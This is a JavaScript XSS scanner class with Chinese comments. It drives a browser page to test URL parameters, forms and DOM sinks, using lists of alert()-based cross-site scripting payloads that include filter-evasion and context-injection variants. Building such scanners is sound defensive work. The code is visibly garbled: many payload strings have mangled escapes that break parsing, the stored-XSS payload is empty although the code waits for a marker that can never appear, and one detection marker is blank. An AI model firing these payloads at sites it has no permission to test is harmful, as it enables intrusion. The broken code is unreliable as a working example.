/**
 * XSS漏洞检测器
 * 本地化程度：100%
 * 检测反射型、存储型和DOM型XSS漏洞
 */

class XSSAnalyzer {
  constructor() {
    // XSS测试载荷
    this.payloads = {
      // 基础XSS测试
      basic: [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<iframe src="javascript:alert(/'XSS\')">',
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '<select onfocus=alert("XSS") autofocus>',
        '<textarea onfocus=alert("XSS") autofocus>',
        '<keygen onfocus=alert("XSS") autofocus>',
        '<video><source onerror="alert(/'XSS\')">'
      ],
      
      // 绕过过滤器的载荷
      evasion: [
        '<ScRiPt>alert("XSS")</ScRiPt>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<img src="javascript:alert(/'XSS\')">', 
        '<img src=# onerror=alert("XSS")>',
        '<img src=/ onerror=alert("XSS")>',
        '<img src="" onerror=alert("XSS")>',
        '<img src=x:alert(alt) onerror=eval(src) alt="XSS">',
        '<img src="x" onerror="alert(/'XSS\')">',
        '<svg><script>alert("XSS")</script></svg>',
        '<math><mi//xlink:href="data:x,<script>alert(/'XSS\')</script>">'
      ],
      
      // 属性注入
      attribute: [
        '" onmouseover="alert(/'XSS\')"',
        '/' onmouseover=\'alert("XSS")/'',
        '" onfocus="alert(/'XSS\')" autofocus="',
        '/' onfocus=\'alert("XSS")/' autofocus=\'',
        '" onclick="alert(/'XSS\')"',
        '/' onclick=\'alert("XSS")/'',
        '"><script>alert("XSS")</script>',
        '/'><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '/'><img src=x onerror=alert("XSS")>'
      ],
      
      // JavaScript上下文
      javascript: [
        'alert("XSS")',
        '/';alert("XSS");//',
        '/';alert("XSS");//',
        '</script><script>alert("XSS")</script>',
        '});alert("XSS");//',
        '///';alert(String.fromCharCode(88,83,83));//',
        '///';alert(String.fromCharCode(88,83,83));//'
      ],
      
      // CSS上下文
      css: [
        '</style><script>alert("XSS")</script>',
        'expression(alert("XSS"))',
        'javascript:alert("XSS")',
        'behavior:url(javascript:alert("XSS"))',
        '-moz-binding:url("data:text/xml;charset=utf-8,<bindings xmlns=//"http://www.mozilla.org/xbl\\"><binding><implementation><constructor>alert(//"XSS\\")</constructor></implementation></binding></bindings>")'
      ]
    };
    
    // XSS检测标记
    this.detectionMarkers = [
      'XSS_TEST_MARKER_',
      'alert("XSS")',
      'alert(/'XSS\')',
      'alert(`XSS`)',
      '',
      'document.write("XSS")'
    ];
    
    // 唯一标识符生成器
    this.uniqueId = () => `XSS_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
  }

  /**
   * 执行XSS漏洞检测
   */
  async analyze(page, baseUrl) {
    try {
      console.log('🔍 开始XSS漏洞检测...');
      
      const results = {
        vulnerabilities: [],
        summary: {
          totalTests: 0,
          vulnerableEndpoints: 0,
          riskLevel: 'low'
        },
        details: {
          reflected: [],
          stored: [],
          dom: []
        }
      };
      
      // 检测反射型XSS
      const reflectedXSS = await this.detectReflectedXSS(page, baseUrl);
      results.details.reflected = reflectedXSS;
      results.vulnerabilities.push(...reflectedXSS);
      
      // 检测存储型XSS
      const storedXSS = await this.detectStoredXSS(page);
      results.details.stored = storedXSS;
      results.vulnerabilities.push(...storedXSS);
      
      // 检测DOM型XSS
      const domXSS = await this.detectDOMXSS(page);
      results.details.dom = domXSS;
      results.vulnerabilities.push(...domXSS);
      
      // 计算总结信息
      results.summary = this.calculateSummary(results.vulnerabilities);
      
      console.log(`✅ XSS检测完成，发现 ${results.vulnerabilities.length} 个潜在漏洞`);
      
      return results;
    } catch (error) {
      console.error('❌ XSS检测失败:', error);
      throw error;
    }
  }

  /**
   * 检测反射型XSS
   */
  async detectReflectedXSS(page, baseUrl) {
    const vulnerabilities = [];
    
    try {
      // 检测URL参数中的反射型XSS
      const url = new URL(baseUrl);
      const params = url.searchParams;
      
      for (const [paramName, paramValue] of params.entries()) {
        const vulns = await this.testParameterForXSS(page, baseUrl, paramName, paramValue);
        vulnerabilities.push(...vulns);
      }
      
      // 检测表单中的反射型XSS
      const formVulns = await this.testFormsForXSS(page);
      vulnerabilities.push(...formVulns);
      
    } catch (error) {
      console.error('反射型XSS检测失败:', error);
    }
    
    return vulnerabilities;
  }

  /**
   * 测试URL参数的XSS
   */
  async testParameterForXSS(page, baseUrl, paramName, originalValue) {
    const vulnerabilities = [];
    
    for (const [type, payloads] of Object.entries(this.payloads)) {
      for (const payload of payloads.slice(0, 3)) { // 限制测试数量
        try {
          const uniqueMarker = this.uniqueId();
          const testPayload = payload.replace(/XSS/g, uniqueMarker);
          
          const testUrl = this.buildTestUrl(baseUrl, paramName, testPayload);
          
          // 设置控制台监听
          const consoleMessages = [];
          page.on('console', msg => {
            if (msg.text().includes(uniqueMarker)) {
              consoleMessages.push(msg.text());
            }
          });
          
          // 设置对话框监听
          let dialogTriggered = false;
          page.on('dialog', async dialog => {
            if (dialog.message().includes(uniqueMarker)) {
              dialogTriggered = true;
            }
            await dialog.dismiss();
          });
          
          await page.goto(testUrl, { waitUntil: 'networkidle2', timeout: 10000 });
          
          // 检查页面内容
          const content = await page.content();
          const isReflected = content.includes(testPayload) || content.includes(uniqueMarker);
          
          if (isReflected || dialogTriggered || consoleMessages.length > 0) {
            vulnerabilities.push({
              type: 'xss',
              subtype: 'reflected',
              severity: 'high',
              confidence: dialogTriggered ? 'high' : 'medium',
              context: {
                type: 'parameter',
                parameter: paramName,
                originalValue,
                payload: testPayload,
                url: testUrl
              },
              evidence: {
                reflected: isReflected,
                dialogTriggered,
                consoleMessages,
                payloadType: type
              },
              description: `参数 ${paramName} 存在反射型XSS漏洞`,
              recommendation: '对用户输入进行HTML编码和验证'
            });
          }
          
          await this.delay(200);
          
        } catch (error) {
          console.warn(`参数XSS测试失败: ${paramName}`, error.message);
        }
      }
    }
    
    return vulnerabilities;
  }

  /**
   * 测试表单的XSS
   */
  async testFormsForXSS(page) {
    const vulnerabilities = [];
    
    try {
      const forms = await page.evaluate(() => {
        const formElements = document.querySelectorAll('form');
        const formData = [];
        
        formElements.forEach((form, index) => {
          /**
           * if功能函数
           * @param {Object} params - 参数对象
           * @returns {Promise<Object>} 返回结果
           */
          const inputs = form.querySelectorAll('input[type="text"], input[type="search"], textarea');
          if (inputs.length > 0) {
            formData.push({
              index,
              action: form.action || window.location.href,
              method: (form.method || 'GET').toUpperCase(),
              inputs: Array.from(inputs).map(input => ({
                name: input.name || `input_${index}`,
                type: input.type,
                selector: `form:nth-child(${index + 1}) ${input.tagName.toLowerCase()}[name="${input.name}"]`
              }))
            });
          }
        });
        
        return formData;
      });
      
      for (const form of forms) {
        for (const input of form.inputs) {
          const vulns = await this.testFormInputForXSS(page, form, input);
          vulnerabilities.push(...vulns);
        }
      }
      
    } catch (error) {
      console.error('表单XSS测试失败:', error);
    }
    
    return vulnerabilities;
  }

  /**
   * 测试表单输入的XSS
   */
  async testFormInputForXSS(page, form, input) {
    const vulnerabilities = [];
    
    for (const payload of this.payloads.basic.slice(0, 2)) {
      try {
        const uniqueMarker = this.uniqueId();
        const testPayload = payload.replace(/XSS/g, uniqueMarker);
        
        // 设置监听器
        let dialogTriggered = false;
        const consoleMessages = [];
        
        page.on('dialog', async dialog => {
          if (dialog.message().includes(uniqueMarker)) {
            dialogTriggered = true;
          }
          await dialog.dismiss();
        });
        
        page.on('console', msg => {
          if (msg.text().includes(uniqueMarker)) {
            consoleMessages.push(msg.text());
          }
        });
        
        // 填充表单
        await page.focus(`input[name="${input.name}"], textarea[name="${input.name}"]`);
        await page.type(`input[name="${input.name}"], textarea[name="${input.name}"]`, testPayload);
        
        // 提交表单
        await page.click('input[type="submit"], button[type="submit"]');
        await page.waitForTimeout(2000);
        
        // 检查结果
        const content = await page.content();
        const isReflected = content.includes(testPayload) || content.includes(uniqueMarker);
        
        if (isReflected || dialogTriggered || consoleMessages.length > 0) {
          vulnerabilities.push({
            type: 'xss',
            subtype: 'reflected',
            severity: 'high',
            confidence: dialogTriggered ? 'high' : 'medium',
            context: {
              type: 'form',
              form: form.action,
              input: input.name,
              payload: testPayload
            },
            evidence: {
              reflected: isReflected,
              dialogTriggered,
              consoleMessages
            },
            description: `表单输入 ${input.name} 存在反射型XSS漏洞`,
            recommendation: '对用户输入进行HTML编码和验证'
          });
        }
        
      } catch (error) {
        console.warn(`表单输入XSS测试失败: ${input.name}`, error.message);
      }
    }
    
    return vulnerabilities;
  }

  /**
   * 检测存储型XSS
   */
  async detectStoredXSS(page) {
    const vulnerabilities = [];
    
    try {
      // 查找可能存储用户输入的表单
      const storageForms = await page.evaluate(() => {
        const forms = document.querySelectorAll('form');
        const storageIndicators = ['comment', 'message', 'post', 'review', 'feedback', 'note'];
        
        return Array.from(forms).filter(form => {
          const formText = form.textContent.toLowerCase();
          const formAction = (form.action || '').toLowerCase();
          
          return storageIndicators.some(indicator => 
            formText.includes(indicator) || formAction.includes(indicator)
          );
        }).map((form, index) => ({
          index,
          action: form.action || window.location.href,
          method: (form.method || 'POST').toUpperCase(),
          inputs: Array.from(form.querySelectorAll('input[type="text"], textarea')).map(input => ({
            name: input.name || `input_${index}`,
            type: input.type || 'text'
          }))
        }));
      });
      
      for (const form of storageForms) {
        const vulns = await this.testStoredXSS(page, form);
        vulnerabilities.push(...vulns);
      }
      
    } catch (error) {
      console.error('存储型XSS检测失败:', error);
    }
    
    return vulnerabilities;
  }

  /**
   * 测试存储型XSS
   */
  async testStoredXSS(page, form) {
    const vulnerabilities = [];
    
    try {
      const uniqueMarker = this.uniqueId();
      const testPayload = `<script></script>`;
      
      // 提交存储型XSS载荷
      for (const input of form.inputs) {
        await page.focus(`input[name="${input.name}"], textarea[name="${input.name}"]`);
        await page.type(`input[name="${input.name}"], textarea[name="${input.name}"]`, testPayload);
      }
      
      await page.click('input[type="submit"], button[type="submit"]');
      await page.waitForTimeout(3000);
      
      // 检查是否执行了存储的脚本
      const consoleMessages = [];
      page.on('console', msg => {
        if (msg.text().includes(`STORED_XSS_${uniqueMarker}`)) {
          consoleMessages.push(msg.text());
        }
      });
      
      // 重新加载页面检查存储型XSS
      await page.reload({ waitUntil: 'networkidle2' });
      await page.waitForTimeout(2000);
      
      if (consoleMessages.length > 0) {
        vulnerabilities.push({
          type: 'xss',
          subtype: 'stored',
          severity: 'critical',
          confidence: 'high',
          context: {
            type: 'form',
            form: form.action,
            payload: testPayload
          },
          evidence: {
            consoleMessages,
            persistent: true
          },
          description: '检测到存储型XSS漏洞',
          recommendation: '对存储的用户输入进行严格的HTML编码和验证'
        });
      }
      
    } catch (error) {
      console.warn('存储型XSS测试失败:', error.message);
    }
    
    return vulnerabilities;
  }

  /**
   * 检测DOM型XSS
   */
  async detectDOMXSS(page) {
    const vulnerabilities = [];
    
    try {
      // 检查DOM操作函数
      const domSinks = await page.evaluate(() => {
        const sinks = [];
        const dangerousFunctions = [
          'innerHTML', 'outerHTML', 'insertAdjacentHTML',
          'document.write', 'document.writeln',
          'eval', 'setTimeout', 'setInterval',
          'Function', 'execScript'
        ];
        
        // 检查页面脚本中是否使用了危险函数
        const scripts = document.querySelectorAll('script');
        scripts.forEach((script, index) => {
          const content = script.textContent || script.innerHTML;
          dangerousFunctions.forEach(func => {
            if (content.includes(func)) {
              sinks.push({
                function: func,
                scriptIndex: index,
                content: content.substring(0, 200) // 只取前200字符
              });
            }
          });
        });
        
        return sinks;
      });
      
      if (domSinks.length > 0) {
        // 测试DOM XSS
        const testUrl = `${page.url()}#<script>alert("DOM_XSS")</script>`;
        
        let dialogTriggered = false;
        page.on('dialog', async dialog => {
          if (dialog.message().includes('DOM_XSS')) {
            dialogTriggered = true;
          }
          await dialog.dismiss();
        });
        
        await page.goto(testUrl, { waitUntil: 'networkidle2' });
        await page.waitForTimeout(2000);
        
        if (dialogTriggered) {
          vulnerabilities.push({
            type: 'xss',
            subtype: 'dom',
            severity: 'high',
            confidence: 'high',
            context: {
              type: 'dom',
              sinks: domSinks,
              testUrl
            },
            evidence: {
              dialogTriggered,
              dangerousFunctions: domSinks.map(s => s.function)
            },
            description: '检测到DOM型XSS漏洞',
            recommendation: '避免使用危险的DOM操作函数，对用户输入进行验证'
          });
        }
      }
      
    } catch (error) {
      console.error('DOM型XSS检测失败:', error);
    }
    
    return vulnerabilities;
  }

  /**
   * 构建测试URL
   */
  buildTestUrl(baseUrl, paramName, payload) {
    const url = new URL(baseUrl);
    url.searchParams.set(paramName, payload);
    return url.toString();
  }

  /**
   * 计算检测总结
   */
  calculateSummary(vulnerabilities) {
    const totalTests = vulnerabilities.length;
    const vulnerableEndpoints = new Set(
      vulnerabilities.map(v => `${v.context.type}:${v.context.parameter || v.context.input || 'dom'}`)
    ).size;
    
    const severities = vulnerabilities.map(v => v.severity);
    let riskLevel = 'low';
    
    if (severities.includes('critical')) {
      riskLevel = 'critical';
    } else if (severities.includes('high')) {
      riskLevel = 'high';
    } else if (severities.includes('medium')) {
      riskLevel = 'medium';
    }
    
    return {
      totalTests,
      vulnerableEndpoints,
      riskLevel,
      criticalCount: severities.filter(s => s === 'critical').length,
      highRiskCount: severities.filter(s => s === 'high').length,
      mediumRiskCount: severities.filter(s => s === 'medium').length,
      lowRiskCount: severities.filter(s => s === 'low').length
    };
  }

  /**
   * 延迟函数
   */
  delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

module.exports = XSSAnalyzer;
